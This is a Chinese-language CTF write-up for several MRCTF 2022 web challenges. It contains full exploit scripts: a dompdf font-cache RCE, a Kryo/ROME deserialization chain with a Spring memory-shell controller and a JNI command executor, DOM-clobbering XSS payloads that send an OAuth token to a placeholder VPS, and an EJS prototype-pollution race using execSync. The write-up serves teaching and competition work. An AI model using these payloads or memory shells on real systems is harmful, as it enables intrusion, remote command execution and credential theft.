# MRCTF Web部分wp

[toc]

### Tprint

tprint的灵感来自一个[1day](https://github.com/positive-security/dompdf-rce) 

当时出题的时候网上分析还没那么多，结果比赛的时候已经有[师傅分析的很透彻了](https://ghostasky.github.io/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/)

主要就是利用dompdf在解析html文件时会默认加载远程css并且进一步缓存远程字体文件的问题。因为未对字体文件后缀进行过滤，导致可以直接缓存任意文件，并且缓存文件名是可以计算出来的。这就导致了一个间接的文件写漏洞。

盗一下github上的攻击示意图：

![](https://md.buptmerak.cn/uploads/upload_33de0f7bc1cd7b4b02da21840baaaaf9.png)

原攻击手法是通过xss来注入css，因为本题不出网，设置了一个文件上传点，通过上传html的方式来进行css注入。我们只需要把恶意字体文件/恶意css/恶意html文件上传上去然后打印我们的恶意文件就能同样触发这个攻击链。

Exp如下：

```python
import requests
from hashlib import md5

url = "http://246abfb2-0f91-48ec-a88c-b2314709ed87.node1.mrctf.fun:81"

font_name = "eki"

def print2pdf(page):
    param= {
        "s":"Printer/print",
        "page":page
    }
    res = requests.get(f"{url}/public/index.php",params=param)
    return res

def upload(filename,raw):
    data = {
        "name":"avatar",
        "type":"image",
    }
    res = requests.post(f"{url}/public/index.php?s=admin/upload",data=data,files={"file":(filename,raw,"image/png")})
    return res.json()["result"]

exp_font = "./exp.php"

php_location = upload("exp.php",open(exp_font,"rb").read())

print(f"php_location=>{php_location}")

exp_css = f"""
@font-face{{
    font-family:'{font_name}';
    src:url('http://localhost:81{php_location}');
    font-weight:'normal';
    font-style:'normal';
}}

css_location = upload("exp.css",exp_css)

print(f"css_location=>{css_location}")


html = f"""
<link rel=stylesheet href='http://localhost:81{css_location}'><span style="font-family:{font_name};">5678</span>
"""

html_location = upload("exp.html",html)


payload = "/storage/"
print(f"html_location=>{html_location}")

p = html_location

print(p)

res  = print2pdf(p)

open("out.pdf","wb").write(res.content)

md5helper = md5()

md5helper.update(f"http://localhost:81{php_location}".encode())

remote_path = f"/vendor/dompdf/dompdf/lib/fonts/{font_name}-normal_{md5helper.hexdigest()}.php"

print(f"remote_path=>{remote_path}")

res = requests.get(url+remote_path)

print(res.text)

```

![](https://md.buptmerak.cn/uploads/upload_4d110c9c519ff2b6422f6021c04f57da.png)


### SpringCoffee

这个题的灵感来自hf2022的ezchain，当时没做出来，赛后学了一波signedObject的二次注入手法，深感巧妙，然后就缝合出了这个题。

首先从``marshalsec``中抓了一个比较冷门的序列器``kyro``,他在反序列化``HashMap``的时候也是会调用``hashCode``的，因此也可用``Rome``这条链子打,不过有个小问题是在默认情况下kryo只能反序列化带有空参构造函数的类，因此需要修改一下kryo的反序列化配置。设置``InstantiatorStarategy``为``org.objenesis.strategy.StdInstantiatorStrategy``，并且关闭调需要注册才能反序列化的功能。题目里给了这样一个接口。

```java
    @RequestMapping("/coffee/demo")
    public Message demoFlavor(@RequestBody String raw) throws Exception {
        System.out.println(raw);
        JSONObject serializeConfig = new JSONObject(raw);
        if(serializeConfig.has("polish")&&serializeConfig.getBoolean("polish")){
            kryo=new Kryo();
            for (Method setMethod:kryo.getClass().getDeclaredMethods()) {
                if(!setMethod.getName().startsWith("set")){
                    continue;
                }
                try {
                    Object p1 = serializeConfig.get(setMethod.getName().substring(3));
                    if(!setMethod.getParameterTypes()[0].isPrimitive()){
                        try {
                            p1 = Class.forName((String) p1).newInstance();
                            setMethod.invoke(kryo, p1);
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                    }else{
                        setMethod.invoke(kryo,p1);
                    }
                }catch (Exception e){
                    continue;
                }
            }
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Output output = new Output(bos);
        kryo.register(Mocha.class);
        kryo.writeClassAndObject(output,new Mocha());
        output.flush();
        output.close();

        return new Message(200,"Mocha!",Base64.getEncoder().encode(bos.toByteArray()));
    }
```

可以修改kryo的配置。

在默认情况下``Spring Controller``是单例的，每个请求拿到的kryo是一样的。因此，我们在``demoFlavor``处通过``set``方法去修改kryo的策略就可以在``order``接口绕过限制

```python
def demo():
    data = {
        "polish":True,
        "References":True,
        "RegistrationRequired":False,
        "InstantiatorStrategy":"org.objenesis.strategy.StdInstantiatorStrategy",
    }
    res = requests.post(url+"/coffee/demo",json=data)

    return res.json()
```


接下来就是ROME反序列化了，不过和hessian2一样，因为不是原生反序列化，``TemplateImpl``的``transient _tfactory``是会序列化过程中丢失的，所以无法直接用，而又因为不出网，所以这里采用经典的ROME二次反序列化：

``ROME->SignedObject->ROME->TemplateImpl``

到了这一步就可以在目标上任意执行字节码了，不过没办法直接``Runtime.getRuntime().exec()``，这是为什么呢？
如果去读目录和文件就会发现目录下有个``rasp.jar``

![](https://md.buptmerak.cn/uploads/upload_67eb421de58c2850a9581ed450342f4e.png)


作用很简单，就是把``java.lang.ProcessImpl``的``start``方法置空了，这样``Runtime``之流就没法执行命令了。

不过因为目标机器是Linux系统，我们可以直接调用``UnixProcess``这个更为底层的类去执行方法，或者可以通过``jni``的方式直接进行系统调用。这里简单介绍一下JNI的方式。

首先还是老规矩注册一个内存马，这里为了方便JNI，直接注入一个没有类依赖关系的``Controller``内存马

```java
static {

        try {
            String inject_uri = "/evil";
            System.out.println("Controller Injecting");
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
                    currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

            Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
            f.setAccessible(true);
            Object mappingRegistry = f.get(mappingHandlerMapping);

            Class<?> c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");

            Method[] ms = c.getDeclaredMethods();

            Field field = null;
            try {
                field = c.getDeclaredField("urlLookup");
                field.setAccessible(true);
            }catch (NoSuchFieldException e){
                field = c.getDeclaredField("pathLookup");
                field.setAccessible(true);
            }

            Map<String, Object> urlLookup = (Map<String, Object>) field.get(mappingRegistry);
            for (String urlPath : urlLookup.keySet()) {
                if (inject_uri.equals(urlPath)) {
                    throw new Exception("already had same urlPath");
                }
            }

            Class <?> evilClass = MSpringJNIController.class;

            Method method2 = evilClass.getMethod("index");

            RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
            option.setPatternParser(new PathPatternParser());

            RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build();

            // 将该controller注册到Spring容器
            mappingHandlerMapping.registerMapping(info, evilClass.newInstance(), method2);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
```


这里一个方法是native的，表示从库中调用，一个方法用来做回显路由

```java
public class MSpringJNIController {
    public native String doExec(String cmd);
    @ResponseBody
    public void index() throws IOException {
        ...
    }
}
```

用javah生成头文件

```c
/* DO NOT EDIT THIS FILE - it is machine generated */
#include <jni.h>
/* Header for class xyz_eki_serialexp_memshell_MSpringJNIController */

#ifndef _Included_xyz_eki_serialexp_memshell_MSpringJNIController
#define _Included_xyz_eki_serialexp_memshell_MSpringJNIController
#ifdef __cplusplus
extern "C" {
#endif
/*
 * Class:     xyz_eki_serialexp_memshell_MSpringJNIController
 * Method:    doExec
 * Signature: (Ljava/lang/String;)Ljava/lang/String;
 */
JNIEXPORT jstring JNICALL Java_xyz_eki_serialexp_memshell_MSpringJNIController_doExec
  (JNIEnv *, jobject, jstring);

#ifdef __cplusplus
}
#endif
#endif
```

然后就可以在对应的``Java_xyz_eki_serialexp_memshell_MSpringJNIController_doExec``函数里写相关逻辑了


这里简单写一个命令执行

```c
#include<jni.h>
#include<stdio.h>
#include<cstdlib>
#include<cstring>
#include "xyz_eki_serialexp_memshell_MSpringJNIController.h"

int execmd(const char *cmd, char *result)
{
    char buffer[1024*12];              //定义缓冲区
    FILE *pipe = popen(cmd, "r"); //打开管道，并执行命令
    if (!pipe)
        return 0; //返回0表示运行失败

    while (!feof(pipe))
    {
        if (fgets(buffer, 256, pipe))
        { //将管道输出到result中
            strcat(result, buffer);
        }
    }
    pclose(pipe); //关闭管道
    return 1;      //返回1表示运行成功
}


JNIEXPORT jstring JNICALL Java_xyz_eki_serialexp_memshell_MSpringJNIController_doExec(JNIEnv *env, jobject thisObj,jstring jstr) {
    const char *cstr = env->GetStringUTFChars(jstr, NULL);
    char result[1024 * 12] = ""; //定义存放结果的字符串数组
    execmd(cstr, result);
    
    char return_messge[256] = "";
    strcat(return_messge, result);
    jstring cmdresult = env->NewStringUTF(return_messge);

    return cmdresult;
}

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved){
    return JNI_VERSION_1_4; //这里很重要，必须返回版本，否则加载会失败。
}
```

然后我们就可以执行命令了

![](https://md.buptmerak.cn/uploads/upload_4128e9956537ffa3e8ebc3e3d32c3e3a.png)


不过为了卡一些奇怪的RCE方式，给``readflag``加了个算数挑战，需要简单交互一下子

![](https://md.buptmerak.cn/uploads/upload_a5b9bfd6c040573bae6a702f517d564b.png)


这里用c也很好实现

```c
static int start_subprocess(char *command[], int *pid, int *infd, int *outfd){
    int p1[2], p2[2];

    if (!pid || !infd || !outfd)
        return 0;

    if (pipe(p1) == -1)
        goto err_pipe1;
    if (pipe(p2) == -1)
        goto err_pipe2;
    if ((*pid = fork()) == -1)
        goto err_fork;

    if (*pid)
    {
        /* Parent process. */
        *infd = p1[1];
        *outfd = p2[0];
        close(p1[0]);
        close(p2[1]);
        return 1;
    }
    else
    {
        /* Child process. */
        dup2(p1[0], 0);
        dup2(p2[1], 1);
        close(p1[0]);
        close(p1[1]);
        close(p2[0]);
        close(p2[1]);
        execvp(*command, command);
        /* Error occured. */
        fprintf(stderr, "error running %s: %s", *command, strerror(errno));
        abort();
    }

err_fork:
    close(p2[1]);
    close(p2[0]);
err_pipe2:
    close(p1[1]);
    close(p1[0]);
err_pipe1:
    return 0;
}

int readnum(int infd)
{
    int sign = 1;
    char x;
    int val = 0;
    read(infd, &x, 1);
    if (x == '-')
    {
        sign = -1;
        read(infd, &x, 1);
    }
    while ( '0'<= x && x <= '9')
    {
        val *= 10;
        val += (x - '0');
        read(infd, &x, 1);
    }
    return val * sign;
}

void solve(char* buf){
    int pid, infd, outfd;
    char *cmd[2];
    cmd[0] = "/readflag";
    cmd[1] = 0;
    start_subprocess(cmd, &pid, &outfd, &infd);
    memset(buf,0,sizeof(buf));

    read(infd, buf, strlen("please answer the challenge below first:\n"));

    int a, b;

    a = readnum(infd);
    b = readnum(infd);


    int ans = a + b;
    char v_str[1000];
    sprintf(v_str, "%d\n", ans);

    write(outfd, v_str, strlen(v_str));
    memset(buf,0,sizeof(buf));
    read(infd, buf, 1000);
    read(infd, buf, 1000);
    read(infd, buf, 1000);
}
```

这俩题的源码都可以在[EkiXu/My-CTF-Challenge](git@github.com:BuptMerak/mrctf-2022-writeups.git)找到

## WebCheckIn

## God_of_GPA
题目环境源码
https://github.com/Ibukifalling/my-ctf-challenge/tree/master/God_of_GPA_docker
### 考点
Xss via DOM Clobbering & Steal Oauth token

### 出题

因为挖学校的洞的时候发现学校的系统用的都是Oauth实现的单点登录，然后打了半天也没打下来。很气，于是就想出一个跟oauth登录有关的题![](https://md.buptmerak.cn/uploads/upload_13bfd5a98885d67a2101d9d2b683a336.png)
[OAuth 2.0 的一个简单解释](http://www.ruanyifeng.com/blog/2019/04/oauth_design.html)
(当然，题目里的oauth认证经过了很多简化，实际场景中还要更复杂一些)

出到一半的时候觉得有点太简单了……碰巧看到DOM Clobbering这个神奇的东西，于是就缝了一下（可能稍微有点脑洞）

(最后被各位师傅用各种非预期打爆了，出题人直接进行一波学习)

(顺便，题目域名中的brt指boren tech-博仁科技)

### 预期解题思路

#### 查看题目Web结构
大致查看一下题目可以发现，题目由两个web组成：博仁科技统一身份认证和博仁课堂。统一身份认证在登录状态下时，博仁课堂可以直接一键登录。

具体的登录过程如下：
在博仁课堂(client端)界面点击一键登录按钮后，转到博仁科技统一身份认证(server端)的oauth认证页面，并且附带一个redirect_uri参数，即成功认证后的重定向地址
![](https://md.buptmerak.cn/uploads/upload_64d29b8fde218578e7601ba5f952fe21.png)

若此时server端为登录状态，则会显示认证成功，设置一个重定向到redirect_uri的跳转，并且带有一个token参数
![](https://md.buptmerak.cn/uploads/upload_8296d07d7711f8a2654eab9a77922c81.png)

client端在接受到这个token参数后会在后端向server端的api进行请求并且获取用户的身份信息（这一步选手是无法看到的），然后以获取到的用户名登录.

登录到博仁课堂后可以查看自己的成绩，当然默认情况是全挂了的![](https://md.buptmerak.cn/uploads/upload_9da87e6114942f79b6c433ea17f2cc6e.png)

![](https://md.buptmerak.cn/uploads/upload_7d6393553713fc8b4334ede94718dcf9.png)

点神秘按钮会跳到一个后门界面，但是这个后门只有管理员能用，说明要拿到管理权限
![](https://md.buptmerak.cn/uploads/upload_d4a56442155fb108ecb277963ba68de3.png)

博仁课堂还有一个树洞功能，可以发文章，但是没办法直接xss。(后端使用了DOMPurify进行过滤)
![](https://md.buptmerak.cn/uploads/upload_cdc86decccfd03b8312ea5648589ae78.png)


回来看server端，给了一个和zbr互动的界面(此处提示了bot的浏览器是chrome，跟之后的xss有关)
![](https://md.buptmerak.cn/uploads/upload_a0a94d9a09ac027189b3ffb62fd8a434.png)


#### Xss via DOM Clobbering

仔细查看博仁树洞查看文章页面的前端代码,发现zbr头像的部分用了一段非常诡异的代码
```htmlbars
<script>
    let Img =  window.MyImg || {src: 'https://md.buptmerak.cn/uploads/upload_d12a3804a813ffb14fe38a318d6bfcf1.png'}
    let Container = document.createElement("div");
    Container.innerHTML = '<img class="avatar" src="' + Img.src + '">';
    document.body.appendChild(Container);
  </script>
```
此处可以利用dom xss，参考-[使用 Dom Clobbering 扩展 XSS](https://xz.aliyun.com/t/7329)

测试一下，文章内容填入
```htmlbars
<a id=MyImg><a id=MyImg name=src href='cid:ibukifalling"onerror="javascript:alert(1111);"//'></a>
```
![](https://md.buptmerak.cn/uploads/upload_8565b4fdec200a6502a7e8ba97df4aa6.png)

这里使用a标签和cid:进行了注入，也有其他师傅用img标签+data:等方式成功注入,注意测试的时候用chrome浏览器

#### Get Token

之前说到过一键登录是通过token实现的，那么很容易想到:让bot访问认证页，然后redirect_uri填自己的vps，不就拿到admin token了吗？

试一下会发现不行，因为redirect_uri有检测![](https://md.buptmerak.cn/uploads/upload_9da87e6114942f79b6c433ea17f2cc6e.png)
![](https://md.buptmerak.cn/uploads/upload_c018ca649cb7983555aa6311eba802af.png)

不过再仔细试一下会发现只要url部分符合就行了，path部分可以随便填，也就是说`redirect_uri=http://brtclient.node3.mrctf.fun/123123`这种格式也是可以的

那么其实可以写两篇xss文章，让bot访问认证页之后重定向到另一篇xss，另一篇xss接到token之后再发送到vps(也有师傅写成二合一，本质上是一样的)

#### exp
part1(网上随便抄的接受get参数方法)
```htmlbars
<a id=MyImg><a id=MyImg name=src href='cid:ibukifalling"onerror="javascript:function getQueryVariable(variable)
        {
               var query = window.location.search.substring(1);
               var vars = query.split(`&`);
               for (var i=0;i<vars.length;i++) {
                       var pair = vars[i].split(`=`);
                       if(pair[0] == variable){return pair[1];}
               }
               return(false);
        }
        var token = getQueryVariable(`token`);
        console.log(token);
        document.write(`<img src=http://yourip/token=`+token+` >`);
        "//'></a>
```

part2

```htmlbars
<a id=MyImg><a id=MyImg name=src href='cid:ibukifalling"onerror="javascript:setTimeout(function(){location.href=`http://brtserver.node3.mrctf.fun/oauth/authorize?redirect_uri=http://brtclient.node3.mrctf.fun/view/part1uuid`},1000)"//'></a>
```

向bot发送part2的uuid，part2会访问oauth认证地址并且重定向到part1，part1再发送到远程监听服务器上，以此获得token

（给没做出来的带火看一下后门长啥样，是一个一键满绩页面）
![](https://md.buptmerak.cn/uploads/upload_d035c57d59aa0b8991baa96cdff22fd3.png)
（输入用户id后可以令该用户所有科目变成一佰分）
![](https://md.buptmerak.cn/uploads/upload_0de5ea9fdc6319e30f21eb9690db440d.png)


### 非预期解

实际比赛中，各路大佬们打出了各种天马行空的非预期，令出题人叹为观止

#### 非预期1-夺舍bot

由于出题人在写正则的时候忘记写开头和结尾匹配，导致发送uuid的校验出现问题...![](https://md.buptmerak.cn/uploads/upload_13bfd5a98885d67a2101d9d2b683a336.png)
![](https://md.buptmerak.cn/uploads/upload_0a240aea1f323e0e4d3c59a4724f2ceb.png)

如果向bot发送形如`uuid/../../login?token=yourtoken`的uuid，可以令bot在博仁课堂端登录上选手本人的账户

那有人就要问了，bot登自己账户有啥用阿？

这里又要甩锅给出题人了...登录成功的页面提示信息是直接拼接用户名的...
![](https://md.buptmerak.cn/uploads/upload_5e2b581c44380f474b63bb2006d5af1b.png)

所以可以在用户名处进行xss...直接把payload写在用户名里...（我哪知道会有人这么玩啊QAQ）

因为此时bot在server端仍然是管理员账号，在用户名的xss中令bot先访问`brtserver.node3.mrctf.fun/oauth/authorize`可以拿回管理员权限，也就是打了一个CSRF
![](https://md.buptmerak.cn/uploads/upload_f6a16a74049c0fa47b1bf97bb961939f.png)

可怕的是居然有多队打出这个非预期...师傅们的脑洞实在是太大了...（有没有一种可能，是出题人的安全开发意识没到位呢）

#### 非预期2-oauth xss

这个比上面那个稍微好一点，但依然震撼出题人一整年……并且也有多队打出了这个非预期……

由于跳转界面也是直接拼接的redirect_uri，而redirect_uri后面的路径是可以随便写的，所以可以在redirect_uri处进行xss![](https://md.buptmerak.cn/uploads/upload_13bfd5a98885d67a2101d9d2b683a336.png)
![](https://md.buptmerak.cn/uploads/upload_e3d94d238140c6c7c08a67662301f0e2.png)

在文章的xss处令bot访问`http://brtserver.node2.buptmerak.cn/oauth/authorize? redirect_uri=http://brtclient.node2.buptmerak.cn/";window.location="http://vps/`可以直接拿到token，这样就不用再弹一次了

#### 非预期3-token是啥？能吃么？

这个应该算是比较正常的非预期了，不尝试获得登录token而是直接令bot访问后门页面。其实把后门页面写成交互式而不是直接获得flag就是希望选手尝试获得token。看来下次还是得在前端加点混淆……

![](https://md.buptmerak.cn/uploads/upload_f6a16a74049c0fa47b1bf97bb961939f.png)

### 后话
![](https://md.buptmerak.cn/uploads/upload_6a2b8b404b27cb17fe8857f679b50909.png)
![](https://md.buptmerak.cn/uploads/upload_30be7d2504b4068cba516842293426d3.png)
![](https://md.buptmerak.cn/uploads/upload_41bf92cb388bf7583a116538edfedb5e.png)

关于本次比赛密码题，强烈推荐
https://www.zhihu.com/answer/2455486891

## Hurry_up
### 考点
原型链污染，模板注入，条件竞争，不出网回显
### 分析
题目还是比较常规，整体来说不难。给了整个的dockefile。题目主体是个node应用。但通过npm查看并没有发现存在漏洞的依赖。题目代码也不多。简单分析一下，不难知道getValue.js的set方法中存在类似merge的操作。并且对键值没有任何的过滤（其实有个黑名单，但并未真正使用），这里的代码其实是改自mpath，这个包有过一个原型链污染的洞，官方就是通过添加黑名单来修复的。
因为应用使用ejs作为模板引擎，加上有了原型链污染的点，下一步自然就是配合模板注入去rce。但进一步尝试，可以发现应用中只有在`/`路由中有模板渲染的操作。而原型链污染的触发点是在`/hide`路由。此外，在应用的入口有个对于原型链污染的防护机制。
```javascript
// csp and no way of pp
app.use(async (req, res, next) => {
    res.header(
        "Content-Security-Policy",
        "default-src 'self';"
    );
    await new Promise(function (resolve) {
        for (var key in Object.prototype) {
            console.log(key);
            delete Object.prototype[key];
        }
        resolve()
    }).then(next)
});
```
所以就算我们通过`/hide`成功污染到原型链，但在下次进入`/`的之前，Object便会被删除所有的属性。我们污染到的属性也就被删除了。
这里便是可以竞争的点。我么知道，对于node，所有请求共用同一个环境，这也就是为什么如果一个请求污染到了原型链，那么之后所有的请求都会受到影响。所以如果，我们在进入`/`之后，而赶在模板渲染之前，在另外一个请求中完成对原型链的污染，这样就可以了。由于node是单线程异步非阻塞模式的，意味着如果一个请求没有处理结束或进入阻塞，下一个请求是不会开始处理的。而在这个题目中，其实有几行很扎眼的代码，帮助我们让给到`/`的请求在模板渲染前进入阻塞。
~~其实可以用一些合乎程序逻辑的数据库查询等io操作把这个阻塞伪装的更好(x~~
```javascript
exports.safeCheck = async function () {
    return await new Promise(function (resolve) {
        setTimeout(resolve, 100);
    })
}
```
所以卡住这个时间点，竞争就好了。
但通过dockerfile可以知道，题目中配置了防火墙，不允许主动访问外网，所以要把命令回显写到response对象中。常见思路可以使用hook，劫持res.end()，~~但对于共用靶机来说，这样太不可控了~~，但因为题目有关于hook的黑名单。~~也不知道能不能防的住~~。
```javascript
var blacklist = ['{', '}', 'function','ook'];
```

### exp
```python
import requests
import threading
from pwn import *
import time
import random


ip=sys.argv[1]
port=sys.argv[2]
command=sys.argv[3]
flag1=True
tempTime = 20

url="http://"+ip+":"+str(port)+"/"

def attack(command):
    global flag1
    t1 = threading.Thread(target=tar1,args=(command,))
    t2 = threading.Thread(target=tar2)
    t2.start()

    # time.sleep(random.random())
    t1.start()
    # time.sleep(2)
    

def tar1(command):
    global flag1
    ran1=-1
    time1=-1
    while flag1:
        print("tar1")
        ran1 = random.random()
        time.sleep(ran1)
        requests.get(
            url+"hide",
            params={
                "path":"a.__proto__.outputFunctionName",
                "value":'''a=1;
        return process.mainModule.require('child_process').execSync('{}').toString();
        var b'''.format(command)
            })
        time1 = time.time()
        # flag1=False
    print("ran1="+str(time1))

s=b'''GET / HTTP/1.1
Host: 127.0.0.1:4000
Connection: close
Pragma: no-cache
Cache-Control: no-cache

'''
def tar2():
    global flag1
    global tempTime
    try:
        while tempTime>0:
            ran2 = random.random()
            time.sleep(ran2)
            io = remote(ip,port)
            io.send(s)
            time2 = time.time()
            re=io.recv()
            # print(re)
            if(b'MRCTF{' in re):
                print(re)
                flag1 =False
                print("ran2="+str(time2))
                return
            io.close()
            tempTime=tempTime-1
        print("fialed!")
        flag1 =False
    except:
        flag1=False



if __name__ == '__main__':
    attack(command)
# python3 ./exp.py 127.0.0.1 4000 'cat /flag'
```

因为是有条件竞争，时间窗给的也不大，exp默认尝试20次，如果没成功可以多运行几次。
关于污染之后如何命令执行并将结果返回，出题人之前的写法十分丑陋，赛后和师傅们交流学习到了十分优雅的写法，这里直接换到wp里了hhh。好像确实是很常规的操作，只能说出题人露怯了。
此外，由于ejs在比赛前3天修复了漏洞并更新到3.1.7。但出题的时候是1个月前，所以附件中写的是 `^3.1.6`。导致一些师傅本地跑附件时搭建的环境和服务器上的有出入。给师傅们造成的不便，出题人深表歉意＞﹏＜。


## EzJAava